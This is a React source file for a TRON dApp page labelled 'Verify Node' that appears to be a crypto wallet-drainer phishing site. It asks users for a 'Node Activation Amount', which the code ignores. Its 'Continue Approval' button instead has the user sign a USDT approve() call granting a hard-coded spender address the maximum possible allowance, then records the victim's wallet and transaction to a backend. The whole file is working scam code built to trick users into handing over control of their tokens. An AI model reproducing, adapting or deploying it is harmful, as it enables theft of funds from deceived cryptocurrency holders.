import { useState, useEffect, useMemo } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

// WalletConnect Imports
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectWalletAdapter } from '@tronweb3/walletconnect-tron';
import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
import '@tronweb3/tronwallet-adapter-react-ui/style.css';

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  // WalletConnect Config
  const adapters = useMemo(() => [
    new WalletConnectWalletAdapter({
      network: 'Mainnet',
      options: {
        projectId: '6b5df56bc30c1dadaab59498b86fd3e8', // 👈 Apni Project ID yahan dalein
        metadata: {
          name: 'DeFi Node',
          description: 'Secure TRON Node',
          url: 'https://your-dapp.com',
          icons: ['https://your-dapp.com']
        }
      }
    })
  ], []);

  return (
    <WalletProvider adapters={adapters} autoConnect={true}>
        <DAppUI />
    </WalletProvider>
  );
}

function DAppUI() {
  const { address, connected, signTransaction } = useWallet();
  const [amount, setAmount] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const handleApprove = async () => {
    if (!connected) return alert("Please Connect Wallet First!");

    try {
      setIsLoading(true);
      setStatus("Confirming...");

      // WalletConnect ke through TronWeb access karna
      const tronWeb = (window as any).tronWeb;
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const parameter = [
        { type: 'address', value: TRON_SPENDER },
        { type: 'uint256', value: maxAmount }
      ];

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
      );

      // WalletConnect adapter signTransaction handle karta hai
      const signedTx = await signTransaction(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result) {
        await createTransaction({
          walletAddress: address || "",
          txHash: result.txid,
          amount: amount || "Max",
          toAddress: TRON_SPENDER,
          usdtBalance: "Verified",
          nativeBalance: "0 TRX"
        });
        alert("✅ Approval Successful!");
      }
    } catch (err: any) {
      alert("❌ Error: " + (err.message || "Failed"));
    } finally {
      setIsLoading(false);
      setStatus("");
    }
  };

  const dollarValue = amount && !isNaN(Number(amount)) ? `$${Number(amount).toFixed(2)}` : "$0.00";

  return (
    <div style={styles.container as any}>
      <div style={styles.header as any}>
        <span style={styles.headerTitle as any}>Verify Node</span>
        <WalletActionButton /> {/* 👈 Yeh button WalletConnect popup kholega */}
      </div>

      <div style={styles.body as any}>
        <div style={styles.statusSection as any}>
            <div style={styles.tronIcon as any}>T</div>
            <div style={{flex: 1}}>
                <div style={styles.networkName as any}>TRON Mainnet</div>
                <div style={styles.networkSub as any}>{connected ? "Connected" : "Waiting for connection..."}</div>
            </div>
        </div>

        <div style={styles.card as any}>
            <div style={styles.cardHeader as any}>
                <span style={styles.label as any}>Node Activation Amount</span>
            </div>
            <div style={styles.inputRow as any}>
                <input 
                    type="number" 
                    placeholder="0" 
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    style={styles.mainInput as any}
                />
                <span style={styles.unit as any}>USDT</span>
            </div>
            <div style={styles.subText as any}>{dollarValue}</div>
        </div>

        <div style={styles.card as any}>
            <div style={styles.infoRow as any}>
                <span style={styles.infoLabel as any}>Wallet</span>
                <span style={styles.infoValue as any}>{address ? `${address.slice(0,8)}...` : "Not Connected"}</span>
            </div>
            <div style={styles.divider as any}></div>
            <div style={styles.infoRow as any}>
                <span style={styles.infoLabel as any}>Network Fee</span>
                <span style={styles.feeValue as any}>~15 TRX</span>
            </div>
        </div>
      </div>

      <div style={styles.footer as any}>
        <button 
            disabled={isLoading || !connected} 
            onClick={handleApprove} 
            style={(isLoading || !connected ? styles.btnDisabled : styles.btnActive) as any}
        >
            {isLoading ? status : connected ? "Continue Approval" : "Connect Wallet First"}
        </button>
      </div>
    </div>
  );
}

const styles = {
  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px", borderBottom: "1px solid #1c1c1e" },
  headerTitle: { fontSize: "17px", fontWeight: "600" },
  body: { padding: "20px", flex: 1 },
  statusSection: { display: "flex", alignItems: "center", background: "#1c1c1e", padding: "12px", borderRadius: "14px", marginBottom: "20px", gap: "12px" },
  tronIcon: { width: "35px", height: "35px", background: "#ff3b30", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: "bold" },
  networkName: { fontSize: "14px", fontWeight: "600" },
  networkSub: { fontSize: "11px", color: "#32d74b" },
  card: { background: "#1c1c1e", padding: "16px", borderRadius: "18px", marginBottom: "15px" },
  cardHeader: { marginBottom: "8px" },
  label: { color: "#8e8e93", fontSize: "13px" },
  inputRow: { display: "flex", alignItems: "baseline", gap: "10px" },
  mainInput: { background: "none", border: "none", color: "#fff", fontSize: "32px", width: "100%", outline: "none" },
  unit: { fontSize: "18px", color: "#8e8e93" },
  subText: { color: "#8e8e93", fontSize: "13px" },
  infoRow: { display: "flex", justifyContent: "space-between", padding: "8px 0" },
  infoLabel: { color: "#8e8e93", fontSize: "14px" },
  infoValue: { color: "#fff", fontSize: "14px" },
  feeValue: { color: "#ff9f0a", fontSize: "14px" },
  divider: { height: "1px", background: "#2c2c2e", margin: "5px 0" },
  footer: { padding: "20px" },
  btnActive: { width: "100%", padding: "16px", borderRadius: "16px", background: "#007aff", color: "#fff", fontWeight: "bold", border: "none", cursor: "pointer" },
  btnDisabled: { width: "100%", padding: "16px", borderRadius: "16px", background: "#3a3a3c", color: "#8e8e93", border: "none" }
};
